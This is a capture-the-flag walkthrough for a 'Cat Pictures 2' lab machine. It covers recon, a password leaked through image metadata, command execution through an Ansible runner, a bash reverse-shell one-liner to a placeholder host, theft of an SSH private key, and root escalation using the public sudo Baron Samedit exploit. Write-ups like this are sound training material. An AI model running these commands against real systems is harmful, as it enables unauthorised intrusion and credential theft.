# Cats Pictures 2

######  Misc, Easy - x1foideo

## Challenge Description

> Now with more Cat Pictures!

## Initial Recon 

#### Nmap

As usual first thing to do is a _nmap_ recognition

```bash
nmap -sS -sV -p- <IP> -o nmap
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?
3000/tcp open  ppp?
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
```

#### Website Check

Exploring the website, and watching all those adorable kittens, there is an interesting description for "_timo-volz_"

<img src="/img/catspictures2/timo-volz.jpg" width="600">

> Description --> note to self: strip metadata


#### Stripping Metadata

Quite interesting description, download the image and follow the hint given in the Title...

OR NOT.

```bash
exiftool <IMAGE_NAME>
```
```
...

XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778
```

Title here is interesting, let's test the new URL and find a note:

```plain
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```


## First Flag

#### Gitea

<img src="/img/catspictures2/gitea.png" width="600">

No words needed...


## Second Flag

#### OliveTin

<img src="/img/catspictures2/olivetin.png" width="600">

Inspecting the web-page, third button says "Run Ansible Playbook", the same playbook.yaml in the ansiblle repo, hosted on Gitea.

Inspecting _playbook.yaml_ we get:
```yaml
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

Command executed should be "whoami", chencking the results in the Logs page on OliveTin, we get "bismuth".

<img src="/img/catspictures2/gitea_meme.jpeg" width="600">

Changing command from "whoami" to "ls", stdout stats that there is a _flag2.txt_, change code again to "cat flag2.txt" and get the second flag.


## Third Flag

Still missing the third flag, usually flags are in the /root folder, so I prayed that a simple

```bash
cat /root/flag3.txt
```

would be all I needed, but unfortunately no... 
"Permission Denied".

#### RevShell & PrivEsc

N00B Version: 
- Visit https://www.revshells.com/
- Insert IP & Port
- Copy and Past

``` bash
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

NB: RevShells suck, so for sth that is more stable and since we know ssh is enabled:
```bash
ls -la
cd ".ssh"
cat id_rsa
```

Copy paste the key in a local _id_rsa.txt_, close the RevShell

```bash
chmod 600 id_rsa.txt
ssh bismuth@<IP> -i 'id_rsa.txt'
```

We need root privilege, so let's check:
> https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

And Run LinPEAS, as we cannot download from the web, a good alternative is download on local machine, run a python server and download it on the victim_machine:

```bash
# host
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh 
sudo python3 -m http.server 80

# victim
curl -L <LOCAL-IP>/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

```plain
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
```

Looking for the CVE-2021-3156
https://github.com/worawit/CVE-2021-3156

> _For Linux distributions that glibc has tcache support and enabled (CentOS 8, Ubuntu >= 17.10, Debian 10):_
> - try **exploit_nss.py** first
> - If an error is not glibc tcache related, you can try **exploit_timestamp_race.c** next

As before:
- Download _exploit_nss.py_ on local machine
- curl it thanks the python-http-server
- chmod +x
- RUN

After becoming root, cd to /root and cat _flag3.txt_


#nmap #revereshell #olivetin #gitea #ssh #id_rsa



